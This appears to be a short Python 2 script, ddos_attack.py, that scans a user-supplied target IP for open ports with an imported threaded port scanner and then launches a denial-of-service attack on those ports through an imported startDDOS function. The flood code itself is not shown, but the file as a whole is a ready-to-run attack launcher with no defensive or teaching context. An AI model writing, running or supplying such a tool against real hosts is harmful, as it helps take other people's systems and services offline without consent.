import sys
from port_scan_threading import get_open_ports
from ddos import startDDOS


if __name__ == '__main__':
    if len(sys.argv) < 3:
        print "Not enough args. Usage: python2 ddos_attack.py target_ip max_port"
        sys.exit(1)

    target_ip = sys.argv[1]
    max_port = int(sys.argv[2])
    open_ports = get_open_ports(target_ip, max_port=max_port)

    if (len(open_ports) < 1):
        print "No open ports"
        sys.exit(0)

    print "Open ports: %s" % open_ports
    print "Starting DDOS"

    startDDOS(target_ip, open_ports, 1)
    
